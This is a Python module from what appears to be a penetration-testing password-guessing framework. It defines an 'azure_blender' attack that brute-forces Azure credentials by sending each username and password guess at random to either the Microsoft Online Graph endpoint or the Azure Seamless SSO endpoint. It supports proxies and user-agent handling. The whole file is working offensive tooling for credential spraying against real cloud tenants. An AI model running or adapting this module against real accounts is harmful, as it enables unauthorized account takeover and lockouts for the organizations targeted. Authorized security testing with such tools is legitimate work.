import re
from bfg.data import loadAzureSSOSoap
from bfg.args import http as http_args
from random import randint
from bfg.shortcuts.http import HTTPModule, handleUA
from . import o365_graph as graph
from . import azure_ad_seamless_sso as sso

def msol_url():
    '''Return an argparse argument for the MSOL URL.
    '''

    return http_args.url(
        name_or_flags=('--msol-url',),
        required=False,
        default=graph.MSONLINE_URL,
        help='Microsoft Online URL to target. Default: %(default)s')

def azure_sso_url():
    '''Return an argparse argument for the Azure SSO URL.
    '''

    return http_args.url(
        name_or_flags=('--azure-sso-url',),
        required=False,
        default=sso.AZURE_SSO_URL,
        help='Azure SSO URL to target. Default: %(default)s')

class Module(HTTPModule):

    name = 'http.azure_blender'

    brief_description = 'Blended attack against Azure'

    description = (
        'Brute force various Azure endpoints:\n'
        ' - Graph'
        ' - Seamless SSO')

    args = [msol_url(), azure_sso_url()] + \
        http_args.getDefaults('url', invert=True)

    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    references = []

    def __init__(self, msol_url, azure_sso_url, proxies, headers,
            verify_ssl, user_agent, allow_redirects, *args, **kwargs):
        self.msol_url = msol_url
        self.azure_sso_url = azure_sso_url

        super().__init__(url=msol_url, proxies=proxies, headers=headers,
            verify_ssl=verify_ssl, user_agent=user_agent,
            allow_redirects=allow_redirects, *args, **kwargs)

    @handleUA 
    def __call__(self, username, password, *args, **kwargs):
        '''Proxy the call request up to the Session object to perform
        authentication.
        '''

        # Is this AI?
        if randint(0,1):
            Session = graph.Session
            url = self.msol_url
        else:
            Session = sso.Session
            url = self.azure_sso_url

        session = Session(url=url,
                headers=self.headers,
                verify_ssl=self.verify_ssl,
                allow_redirects=self.allow_redirects)

        if self.proxies:
            session.proxies.update(self.proxies)

        outcome, valid_account, events = session.authenticate(username,
                password)

        events = events if events else []

        return dict(outcome=outcome,
                username=username,
                password=password,
                actionable=valid_account,
                events=events)




